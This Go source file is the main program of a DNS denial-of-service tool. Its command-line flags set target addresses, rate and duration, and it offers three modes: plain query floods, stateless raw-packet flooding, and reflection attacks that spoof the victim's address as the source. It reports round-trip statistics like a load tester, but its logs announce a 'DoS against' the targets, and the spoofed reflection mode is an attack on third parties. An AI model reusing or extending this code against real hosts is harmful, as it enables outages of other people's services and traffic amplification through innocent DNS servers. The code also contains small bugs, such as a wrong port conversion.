package main

import (
	"flag"
	"fmt"
	"log"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"

	"./lib/channels/chanman"
	"./lib/protocols/dnsproto"
	"./lib/protocols/dnsproto/dnsstat"
)

var protoFlag = flag.String("p", "dns", "Specify protocol to use for DoS (default: dns)") //specify which protocol to use, only dns for now
var destPort = flag.Uint("P", 53, "Specify destination port for DoS. (default: 53)")      //specify the destinaton port to use, 53 is the default
var destIPs = flag.String("d", "127.0.0.1", "Specify an single host or a list of destination hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5) (default: 127.0.0.1)")
var srcIPs = flag.String("s", "127.0.0.1", "Specify an single host or a list of source hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5), only used for flood or reflection attacks. (default: 127.0.0.1)")
var rateFlag = flag.Uint("r", 5, "Specify the amount of protocol requests per second. (default: 5)")
var queryRecord = flag.String("q", "time.apple.com", "Specify the host to query for. The default offers a 300 byte response. (default: time.apple.com)")
var durationFlag = flag.Uint("D", 60, "Specify the total duration of the test (default: 60 seconds)")
var interfaceFlag = flag.String("i", "eth0", "Specify which interface name to eject packets from (default: eth0)")
var floodFlag = flag.Bool("F", false, "Specifies if the dns request should be flooded statelessly from the host running the tool. (default: false)")
var reflectionFlag = flag.Bool("R", false, "If set to true the specified then specify the source IPs to spoof the requests from. In this case the source IPs are destination IPs and the destination is the source. (default: false)")
var verboseFlag = flag.Bool("v", false, "Output each request (default: true)")

func main() {
	//Set the runtime to the max number of available CPUs
	runtime.GOMAXPROCS(runtime.NumCPU())

	//inialize the comminications channels for managing goroutines
	cm := chanman.NewChanMan()

	//initalize a config
	cfg := NewConfig()

	//initailize the wait group used to manage the threads
	wg := new(sync.WaitGroup)

	//stats
	stats := new(dnsstat.Stats)
	stats.InfoCollection = make([]dnsstat.Info, 0)

	//initialize the counters for our statistcs
	var runCounter uint
	runCounter = 0
	var queryCounter int
	queryCounter = 0

	//parse the command line options
	flag.Parse()
	//check the provided options
	if *protoFlag == "dns" {
		cfg.SetProtocol("dns")
	} else {
		log.Fatalf("The specified protocol %s is not supported", protoFlag)
	}

	if destPort != nil && *destPort < 65536 && *destPort > 1 {
		cfg.SetDstPort(uint16(*destPort)) //cast to uint16
	} else {
		log.Fatalf("The defiened destination port %d is outside of the accepted range\n", destPort)
	}

	if destIPs != nil {
		//process dest IPs to string array
		cfg.SetDstIPsByString(*destIPs)
	} else {
		log.Fatalf("Error in parsing the specified destination IPs %s\n", destIPs)
	}

	if srcIPs != nil {
		//process dest IPs to string array
		log.Println("SET SRC", *srcIPs)
		cfg.SetSrcIPsByString(*srcIPs)
	} else {
		log.Fatalf("Error in parsing the specified souce IPs %s\n", destIPs)
	}

	if *rateFlag > 0 {
		cfg.SetRate(uint(*rateFlag))
	} else {
		log.Fatalf("The specified rate %d is not within an acceptable range\n", rateFlag)
	}

	if *durationFlag > 0 {
		cfg.SetDuration(uint(*durationFlag))
	} else {
		log.Fatalf("The specified duration %d is not within an acceptable range\n", durationFlag)
	}

	if interfaceFlag != nil {
		//take interface string and specify the correct index
		cfg.SetInterfaceByName(*interfaceFlag)
	} else {
		log.Fatalf("The egress interface was not specified\n")
	}

	if queryRecord != nil {
		cfg.SetQuery(*queryRecord)
	} else {
		log.Fatalf("Error setting the record to query for %s\n", queryRecord)
	}

	//configure startup for test

	log.Printf("Starting DoS against %s on Port %d via protocol %s at rate %d/s\n", *destIPs, *destPort, *protoFlag, *rateFlag)

	ticker := time.NewTicker(time.Second * 1)

	//Intialize goroutine to collect stats
	go func() {
		for {
			select {
			case val := <-cm.RunChan:
				if val == true {
					queryCounter = queryCounter + 1
				} else if val == false {
					return
				}
			case val := <-cm.StatsChan:
				//aggregate stats
				if *verboseFlag == true {
					log.Printf("Query Time %s", val.Rtt)
				}
				stats.InfoCollection = append(stats.InfoCollection, *val)
			}
		}
	}()

	//types stateful, flood, reflection
	if *floodFlag != true && *reflectionFlag != true {

		//start a stateful request flow
		// A stateful request is initiated by the client running the tool
		config := new(dns.ClientConfig)
		config.Servers = strings.Split(*destIPs, ":")
		config.Port = string(*destPort)
		config.Ndots = 1
		config.Timeout = 1
		config.Attempts = 1
		for _ = range ticker.C {
			runCounter = runCounter + 1
			var i uint
			for i = 0; i < cfg.Rate; i++ {
				wg.Add(1)
				go dnsproto.DnsQuery(cfg.Query, wg, config, cm)
			}
			if runCounter == *durationFlag {
				wg.Wait()
				min, max, avg, jitter := stats.Calc()
				fmt.Printf("rtt min/avg/max/mdev = %s/%s/%s/%s\n", min, max, avg, jitter)
				fmt.Printf("Completed %d queries over %d runs to %s\n", queryCounter, runCounter, *destIPs)
				break
			}
		}
	} else if *floodFlag && *reflectionFlag != true {
		for _ = range ticker.C {
			runCounter = runCounter + 1
			var i uint
			for i = 0; i < cfg.Rate; i++ {
				wg.Add(1)
				rawQuery := NewRawDNS()
				rawQuery.SetLocalAddress(cfg.SrcIPs[0])
				rawQuery.SetRemoteAddress(cfg.DstIPs[0])
				rawQuery.SetDestPort(cfg.DstPort)
				go rawQuery.DnsQuery(wg, cfg, cm)
			}
			if runCounter == *durationFlag {
				wg.Wait()
				log.Printf("Completed %d queries over %d runs to %s", queryCounter, runCounter, *destIPs)
				break
			}
		}
	} else if *reflectionFlag && *floodFlag != true {
		//reflect off of destination hosts from source IPs
		for _ = range ticker.C {
			runCounter = runCounter + 1
			var i uint
			for i = 0; i < cfg.Rate; i++ {
				wg.Add(1)
				rawQuery := NewRawDNS()
				rawQuery.SetLocalAddress(cfg.DstIPs[0])
				rawQuery.SetRemoteAddress(cfg.SrcIPs[0])
				rawQuery.SetDestPort(cfg.DstPort)
				go rawQuery.DnsQuery(wg, cfg, cm)
			}
			if runCounter == *durationFlag {
				wg.Wait()
				log.Printf("Completed %d queries over %d runs to %s", queryCounter, runCounter, *destIPs)
				break
			}
		}
	} else if *reflectionFlag && *floodFlag {
		//not a valid state
		log.Fatalln("The selection of reflection and flood flags is invalid. Please choose a supported combination.")
	} else {
		//no state decided
		log.Fatalln("Please choose a supported combinatio of operational flags.")
	}

}
